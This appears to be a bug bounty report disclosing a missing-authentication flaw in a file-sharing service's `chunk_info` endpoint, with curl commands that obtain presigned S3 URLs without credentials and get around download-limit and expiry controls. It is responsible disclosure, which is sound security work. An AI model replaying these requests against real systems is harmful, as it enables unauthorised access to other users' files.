# Critical: Missing Authentication on file content-serving endpoint (`chunk_info`) allows unauthenticated retrieval of ANY file in ANY workspace share-link "Limit to 1 download" and "Expiration date" are simply the first symptoms of this

## Summary

`GET /api/space/{space_id}/file/{file_id}/chunk_info` — the endpoint that issues the presigned S3 URL used to fetch a file's encrypted content — performs **no authentication or authorization check whatsoever**. Not "wrong scope," not "stale credential still honored": no `Authorization` header of any kind is required at all, and any header value (including a garbage, non-derived one) is accepted identically.

This was discovered while testing the document Share link's **"Limit to 1 download"** and **"Expiration date"** controls, which both appeared bypassable via presigned-URL reuse. Digging into the actual root cause showed the real bug is much larger: `chunk_info` never validates *any* credential — not a session, not a share key, not workspace membership, not role, not share state. As a direct consequence:

- A share-link's "Limit to 1 download" and "Expiration date" settings are unenforceable (demonstrated below)
- **Every file in every workspace on the platform can be fetched by anyone who has ever seen its `(space_id, file_id)` pair — with zero authentication, zero relationship to that workspace, and no way to revoke access afterward** (removing a member, deleting a share, or letting a link expire does not matter, because `chunk_info` never checked any of that state to begin with)

This directly matches the program's top qualifying class: *"Any attack allowing to access files/messages stored in a workspace/conversation you are not part of."*

## Vulnerability Type

Broken Access Control / Missing Authentication for a Critical Function (CWE-306). The share-link timing/consumption issues are a secondary Business Logic Error (CWE-841) caused by the same root cause.

## Affected Endpoint

```
GET /api/space/{space_id}/file/{file_id}/chunk_info
```

Returns `chunk_name`, `enc_chunk_key`, and a presigned S3 `object_url` (`X-Amz-Expires=86400`, i.e. valid 24h from issuance) sufficient to fetch the file's ciphertext directly from `bountynew.s3.eu-west-3.amazonaws.com`, completely bypassing the application layer after that point. Note the endpoint doesn't even accept a share `token` as a parameter — there is nothing for it to check against.

Every other endpoint touched during this test (`/api/shared_file/{token}`, `/api/space/{id}/file_revisions`, `/api/space/{id}/shared_file`, write endpoints, etc.) correctly enforces `Cryptonuage-SIGMA` session auth or `Cryptonuage-ShareAuthKey` share auth, and correctly tracks state (`unique_download`, `not_after`). `chunk_info` alone appears to have never been wired into that middleware.

## Steps to Reproduce

**Account used:** `thepiyushkumarshukla-ywh-6f1f373c65425919@yeswehack.ninja` (own primary test account). Section 4 uses a second account I also own, granted `viewer` role on a workspace owned by that second account's identity — both accounts are mine, so this is standard two-account testing, not third-party access.

### 1. Baseline — confirm the endpoint works normally (authenticated, own file)

Standard session, own workspace `625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw`, own file `pZSxOliqI32heUd7K2Ar2aTAz5GzlAuf68iqy9Jbsdk` — works as expected via the app UI, `chunk_info` called with a valid `Cryptonuage-SIGMA` session.

### 2. Remove the Authorization header entirely — own file, own space

```bash
curl -s "https://bounty.cryptobox.com/api/space/625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw/file/pZSxOliqI32heUd7K2Ar2aTAz5GzlAuf68iqy9Jbsdk/chunk_info" \
  -H "Cryptobox-Version: v4.41" -H "Cryptobox-User-Agent: Web/4.41.447 (; ; )"
```

Result: `HTTP/2 200`, full `chunk_info` response with a working presigned S3 `object_url`. No `Authorization` header of any kind was sent.

### 3. Garbage, non-derived Authorization value — same result

```bash
curl -s "https://bounty.cryptobox.com/api/space/625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw/file/pZSxOliqI32heUd7K2Ar2aTAz5GzlAuf68iqy9Jbsdk/chunk_info" \
  -H "Authorization: Cryptonuage-ShareAuthKey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
  -H "Cryptobox-Version: v4.41" -H "Cryptobox-User-Agent: Web/4.41.447 (; ; )"
```

Result: `HTTP/2 200`, identical working presigned URL. The header isn't validated — its presence or absence, or its value, makes no difference at all.

### 4. Cross-workspace, cross-role test — a workspace this identity does not own, at a role that shouldn't have local decryption capability

The primary test account holds **viewer** role (not owner) on a workspace owned by a second account I also control (space `LWfWZohmfSfwpsG9iTk_wSZu2y_AVwE_o46og7UPxy8`). The app's own UI marks this workspace's files as unavailable to a viewer on this device: *"You are consulting this workspace as viewer, the greyed documents are not available from this device."* I independently obtained the real file ID for this workspace via the account's own legitimate (viewer-permitted) `GET /api/space/{id}/file_revisions` call — `content_id: bLS-2SmNC0wlctSAThDGkbSYyPQrrV90p-aTqwgPc24`. Then, with no Authorization header:

```bash
curl -s "https://bounty.cryptobox.com/api/space/LWfWZohmfSfwpsG9iTk_wSZu2y_AVwE_o46og7UPxy8/file/bLS-2SmNC0wlctSAThDGkbSYyPQrrV90p-aTqwgPc24/chunk_info" \
  -H "Cryptobox-Version: v4.41" -H "Cryptobox-User-Agent: Web/4.41.447 (; ; )"
```

Result: `HTTP/2 200`, full working presigned S3 URL for that file — despite zero credentials being presented, and despite the application's own UI stating this exact content is not available to this account on this device.

### 5. Concrete symptom — "Limit to 1 download" is fully bypassable

Reproduced twice, independently, on two separate share links (same file, two different tokens/keys):

1. Create a share link with **Limit to 1 download** enabled → get `token` + derived `ShareAuthKey`.
2. Complete one legitimate download through the normal flow → `POST /api/shared_file/{token}/acknowledge` fires (`200`).
3. Confirm the app-layer gate: open the same share link fresh → `GET /api/shared_file/{token}` now returns *"The sharing is not valid or has expired, please check the link with your contact."* This part is enforced correctly.
4. Call `chunk_info` directly for that same file (no token, no auth header) anyway:
   ```bash
   curl -s "https://bounty.cryptobox.com/api/space/625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw/file/pZSxOliqI32heUd7K2Ar2aTAz5GzlAuf68iqy9Jbsdk/chunk_info" \
     -H "Cryptobox-Version: v4.41" -H "Cryptobox-User-Agent: Web/4.41.447 (; ; )"
   ```
   Result: `HTTP/2 200`, still issues a fresh, working presigned URL — even though step 3 already confirmed the application considers this share fully consumed and invalid.

### 6. Concrete symptom — "Expiration date" is fully bypassable

Captured the real `POST /api/space/{space_id}/shared_file` request body from the app (own valid session), then replayed it with **`not_after` set to `2020-01-01T00:00:00.000Z`** — already six years expired at creation time:

```bash
curl -s -X POST "https://bounty.cryptobox.com/api/space/625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw/shared_file" \
  -H 'Authorization: Cryptonuage-SIGMA sigma_session_id="<own session>"' \
  -H "Content-Type: application/json" \
  -d '{...,"file_ids":["7boa0qYjYRm3gACq8AbOR9B30kcei7i4hdGy0BTxW6c"],"not_after":"2020-01-01T00:00:00.000Z",...}'
```

Result: `HTTP 200`, `{"token":"-Bg_wZlhBpxpvvo3qaHc2g"}` — server accepted an already-expired timestamp with no server-side validation against the current time.

Confirming the split:
```bash
# Metadata endpoint correctly enforces expiry:
curl -s "https://bounty.cryptobox.com/api/shared_file/-Bg_wZlhBpxpvvo3qaHc2g" ...
→ 404 {"code":"file_sharing_expired","message":"file_sharing_expired"}

# chunk_info ignores it entirely:
curl -s "https://bounty.cryptobox.com/api/space/625X0Sx6Jn5wfBSQlpI3gp6nyhId6Vx9iNDroqAVOQw/file/7boa0qYjYRm3gACq8AbOR9B30kcei7i4hdGy0BTxW6c/chunk_info" \
  -H "Cryptobox-Version: v4.41" -H "Cryptobox-User-Agent: Web/4.41.447 (; ; )"
→ 200, working presigned URL
```

## Impact

Content confidentiality on this platform is protected **only by the difficulty of guessing a `(space_id, file_id)` pair**, not by any actual authorization check, at the one endpoint that matters most: the one that hands out the key to the actual file bytes. Concretely:

- **No revocation is possible, ever.** Removing a member from a workspace, deleting a share link, letting "Limit to 1 download" or "Expiration date" fire — none of it matters, because `chunk_info` never checked membership, share state, or expiry in the first place. Anyone who has ever legitimately seen a file's ID (a removed collaborator, an expired share recipient, a viewer on an old device, anyone `cc`'d once) retains permanent, unauthenticated re-access.
- **The three sharing-security controls this product exposes to users — role-based workspace access, "Limit to 1 download," and "Expiration date" — are all simultaneously defeated** by this one gap, because all three assume the content-serving layer respects application state that it never actually reads.
- Content returned is still AES-encrypted ciphertext (this is an E2EE product), so this is not a direct plaintext leak by itself — but the program's own scope explicitly lists unauthorized access to *"files/messages stored in a workspace/conversation you are not part of"* as a qualifying, rewarded vulnerability class independent of encryption, because (a) it defeats every access-control guarantee the product claims to provide, and (b) any decryption-key exposure elsewhere (a compromised device, a leaked `space_client_key`, a future bug) instantly compounds into full plaintext disclosure with no possibility of the server-side controls having limited exposure in the interim.
